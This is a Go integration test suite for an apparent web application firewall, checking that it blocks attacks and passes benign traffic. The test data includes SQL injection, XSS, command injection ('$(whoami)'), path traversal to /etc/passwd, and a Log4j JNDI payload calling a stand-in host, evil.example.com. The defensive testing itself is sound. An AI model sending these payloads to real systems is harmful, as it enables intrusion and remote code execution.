//go:build integration

package e2e

import (
	"bytes"
	"net"
	"net/http"
	"net/http/httptest"
	"sync"
	"testing"
	"time"

	"github.com/Panharoth06/raiwall/internal/core/auth"
	"github.com/Panharoth06/raiwall/internal/core/control"
	"github.com/Panharoth06/raiwall/internal/core/rate"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestEndToEndEnterpriseSuite(t *testing.T) {
	f := setupEnterpriseFixture(t)

	// 1. Semantic Threat Detection & Sensitivity Modes
	t.Run("Semantic Threat Detection and Modes", func(t *testing.T) {
		threats := []struct {
			name   string
			method string
			path   string
			query  string
			header http.Header
			body   []byte
		}{
			{"SQL Injection", http.MethodGet, "/catalog", "id=1'%20OR%20'1'='1", nil, nil},
			{"XSS Injection", http.MethodGet, "/search", "q=%3Cscript%3Ealert(1)%3C/script%3E", nil, nil},
			{"Command Injection", http.MethodPost, "/exec", "", http.Header{"Content-Type": []string{"application/json"}}, []byte(`{"cmd":"$(whoami)"}`)},
			{"Path Traversal", http.MethodGet, "/files", "path=../../../../etc/passwd", nil, nil},
		}

		for _, tc := range threats {
			req := httptest.NewRequest(tc.method, tc.path+"?"+tc.query, bytes.NewReader(tc.body))
			if tc.header != nil {
				req.Header = tc.header.Clone()
			}
			req.RemoteAddr = "10.0.0.10:12345"
			rec := httptest.NewRecorder()

			err := f.mw.ServeHTTP(rec, req, f.defaultNext)
			require.NoError(t, err)
			assert.Equal(t, http.StatusForbidden, rec.Code, "Expected threat %s to be blocked", tc.name)
		}

		// Verify Audit Mode allows threat through without blocking
		control.StoreSnapshot(control.NewConfigSnapshot(101, control.ModeAudit, nil))
		reqAudit := httptest.NewRequest(http.MethodGet, "/catalog?id=1'%20OR%20'1'='1", nil)
		reqAudit.RemoteAddr = "10.0.0.11:12345"
		recAudit := httptest.NewRecorder()

		err := f.mw.ServeHTTP(recAudit, reqAudit, f.defaultNext)
		require.NoError(t, err)
		assert.Equal(t, http.StatusOK, recAudit.Code, "Audit mode should not block threats")
		control.StoreSnapshot(control.NewConfigSnapshot(102, control.ModeDefense, nil))
	})

	// 2. CVE Virtual Patching
	t.Run("CVE Virtual Patching", func(t *testing.T) {
		cveAttacks := []struct {
			name   string
			path   string
			header http.Header
		}{
			{"Log4j JNDI RCE", "/api/v1/data", http.Header{"X-Api-Version": []string{"${jndi:ldap://evil.example.com/a}"}}},
			{"Apache Shiro Bypass", "/admin;/secret", nil},
			{"Git Repository Disclosure", "/.git/config", nil},
		}

		for _, tc := range cveAttacks {
			req := httptest.NewRequest(http.MethodGet, tc.path, nil)
			if tc.header != nil {
				req.Header = tc.header.Clone()
			}
			req.RemoteAddr = "10.0.0.20:12345"
			rec := httptest.NewRecorder()

			err := f.mw.ServeHTTP(rec, req, f.defaultNext)
			require.NoError(t, err)
			assert.Equal(t, http.StatusForbidden, rec.Code, "Expected CVE attack %s to be blocked", tc.name)
		}

		// Benign traffic must cleanly pass
		reqBenign := httptest.NewRequest(http.MethodGet, "/search?q=electronics", nil)
		reqBenign.RemoteAddr = "10.0.0.21:12345"
		recBenign := httptest.NewRecorder()

		err := f.mw.ServeHTTP(recBenign, reqBenign, f.defaultNext)
		require.NoError(t, err)
		assert.Equal(t, http.StatusOK, recBenign.Code)
	})

	// 3. Dynamic UpstreamPool Path Routing & Header Overrides
	t.Run("Dynamic UpstreamPool Path Routing", func(t *testing.T) {
		appCfg := &control.AppConfig{
			ID:        "app-e2e",
			Hostnames: []string{"enterprise.internal"},
			Mode:      control.ModeDefense,
			ForwardingRules: []control.ForwardingRule{
				{
					Prefix:             "/api/v2",
					StripPrefix:        true,
					HostHeaderOverride: "api.internal.service",
					IsActive:           true,
					Upstreams: []control.UpstreamTarget{
						{Dial: "api.internal.service:8080", Weight: 1},
					},
				},
			},
		}
		snap := control.NewConfigSnapshot(103, control.ModeDefense, []*control.AppConfig{appCfg})
		control.StoreSnapshot(snap)

		req := httptest.NewRequest(http.MethodGet, "http://enterprise.internal/api/v2/users", nil)
		req.RemoteAddr = "10.0.0.30:12345"
		rec := httptest.NewRecorder()

		err := f.mw.ServeHTTP(rec, req, f.defaultNext)
		require.NoError(t, err)
		assert.Equal(t, http.StatusOK, rec.Code)
		assert.Contains(t, rec.Body.String(), "api_v2")
		assert.Equal(t, "api.internal.service", rec.Header().Get("X-Received-Host"))
	})

	// 4. Active Ban Table & Emergency Unblock All
	t.Run("Active Ban and Emergency Unblock All", func(t *testing.T) {
		banIP := "10.0.0.99"
		f.banManager.BanIP(net.ParseIP(banIP), 10*time.Minute, "e2e active ban test")

		reqBanned := httptest.NewRequest(http.MethodGet, "/public-data", nil)
		reqBanned.RemoteAddr = banIP + ":54321"
		recBanned := httptest.NewRecorder()

		err := f.mw.ServeHTTP(recBanned, reqBanned, f.defaultNext)
		require.NoError(t, err)
		assert.Equal(t, http.StatusForbidden, recBanned.Code)

		// Emergency unblock-all releases the ban immediately
		f.banManager.ReleaseAll()

		reqUnbanned := httptest.NewRequest(http.MethodGet, "/public-data", nil)
		reqUnbanned.RemoteAddr = banIP + ":54321"
		recUnbanned := httptest.NewRecorder()

		err = f.mw.ServeHTTP(recUnbanned, reqUnbanned, f.defaultNext)
		require.NoError(t, err)
		assert.Equal(t, http.StatusOK, recUnbanned.Code)
	})

	// 5. Virtual Waiting Room (HTTP 465) & Token Admission
	t.Run("Virtual Waiting Room and Token Admission", func(t *testing.T) {
		wm := f.waitingRoom
		rel1 := wm.AcquireLease()
		defer rel1()
		rel2 := wm.AcquireLease()
		defer rel2()

		clientIP := "10.0.0.77"
		reqWait := httptest.NewRequest(http.MethodGet, "http://example.com/queue-target", nil)
		reqWait.Header.Set("Accept", "text/html")
		reqWait.RemoteAddr = clientIP + ":12345"
		recWait := httptest.NewRecorder()

		err := f.mw.ServeHTTP(recWait, reqWait, f.defaultNext)
		require.NoError(t, err)
		assert.Equal(t, rate.StatusWaitingRoom, recWait.Code)

		// Client with admission token passes through
		token := wm.GenerateAdmissionToken(net.ParseIP(clientIP), "", 10*time.Minute)
		reqAdmitted := httptest.NewRequest(http.MethodGet, "http://example.com/queue-target", nil)
		reqAdmitted.RemoteAddr = clientIP + ":12345"
		reqAdmitted.AddCookie(&http.Cookie{Name: rate.WaitingRoomClearanceCookie, Value: token})
		recAdmitted := httptest.NewRecorder()

		err = f.mw.ServeHTTP(recAdmitted, reqAdmitted, f.defaultNext)
		require.NoError(t, err)
		assert.Equal(t, http.StatusOK, recAdmitted.Code)
	})

	// 6. Pre-Application Zero-Trust Auth Gateway
	t.Run("Pre-Application Auth Gateway", func(t *testing.T) {
		// Unauthenticated request receives redirect or 401
		reqUnauth := httptest.NewRequest(http.MethodGet, "/private/dashboard", nil)
		reqUnauth.RemoteAddr = "10.0.0.80:12345"
		recUnauth := httptest.NewRecorder()

		err := f.mw.ServeHTTP(recUnauth, reqUnauth, f.defaultNext)
		require.NoError(t, err)
		assert.True(t, recUnauth.Code == auth.ChallengeStatusCode || recUnauth.Code == http.StatusUnauthorized)

		// Authenticated request with session cookie succeeds and passes identity
		cookie, err := f.sessionMgr.CreateSessionCookie(&auth.UserIdentity{
			Subject: "enterprise-admin",
			Email:   "admin@enterprise.internal",
			Roles:   []string{"admin"},
		})
		require.NoError(t, err)

		reqAuth := httptest.NewRequest(http.MethodGet, "/private/dashboard", nil)
		reqAuth.RemoteAddr = "10.0.0.80:12345"
		reqAuth.AddCookie(cookie)
		recAuth := httptest.NewRecorder()

		err = f.mw.ServeHTTP(recAuth, reqAuth, f.defaultNext)
		require.NoError(t, err)
		assert.Equal(t, http.StatusOK, recAuth.Code)
	})

	// 7. Deterministic Custom HTML Templates & Corporate Branding
	t.Run("Custom HTML Template with Corporate Branding", func(t *testing.T) {
		customHTML := `<!DOCTYPE html><html><head><style>{{.CustomCSS}}</style></head><body><div class="enterprise-banner"><h1>Security Gate: {{.BrandName}}</h1><p>Event: {{.EventID}}</p><p>IP: {{.ClientIP}}</p></div></body></html>`
		customCSS := `.enterprise-banner { background: #000; color: #00ffcc; }`
		_, err := f.mw.TemplateManager().SetCustomTemplate(403, "Enterprise Shield", customHTML, customCSS, "CyberDyne Systems", "")
		require.NoError(t, err)

		req := httptest.NewRequest(http.MethodGet, "/catalog?id=1'%20OR%20'1'='1", nil)
		req.RemoteAddr = "10.0.0.90:12345"
		rec := httptest.NewRecorder()

		err = f.mw.ServeHTTP(rec, req, f.defaultNext)
		require.NoError(t, err)
		assert.Equal(t, http.StatusForbidden, rec.Code)
		body := rec.Body.String()
		assert.Contains(t, body, "CyberDyne Systems")
		assert.Contains(t, body, ".enterprise-banner { background: #000; color: #00ffcc; }")
		assert.Contains(t, body, "10.0.0.90")
		eventID := rec.Header().Get("X-Raiwall-Event-ID")
		assert.NotEmpty(t, eventID)
		assert.Contains(t, body, eventID)
	})

	// 8. Named IP Groups BART Lookup
	t.Run("Named IP Groups BART Lookup", func(t *testing.T) {
		assert.True(t, f.ipGroupMgr.InGroupStr("66.249.66.1", "search_spiders"))
		assert.True(t, f.ipGroupMgr.InGroupStr("185.220.101.5", "malicious_threat_intel"))
		assert.False(t, f.ipGroupMgr.InGroupStr("1.2.3.4", "search_spiders"))
	})

	// 9. Zero Race Conditions under High Concurrency
	t.Run("High Concurrency Zero Race Verification", func(t *testing.T) {
		const concurrentWorkers = 40
		var wg sync.WaitGroup
		wg.Add(concurrentWorkers)

		for i := 0; i < concurrentWorkers; i++ {
			go func(idx int) {
				defer wg.Done()
				path := "/search?q=electronics"
				if idx%2 == 0 {
					path = "/api/v1/benign"
				}
				req := httptest.NewRequest(http.MethodGet, path, nil)
				req.RemoteAddr = "192.0.2.10:12345"
				rec := httptest.NewRecorder()
				_ = f.mw.ServeHTTP(rec, req, f.defaultNext)
				assert.Equal(t, http.StatusOK, rec.Code)
			}(i)
		}

		wg.Wait()
	})
}
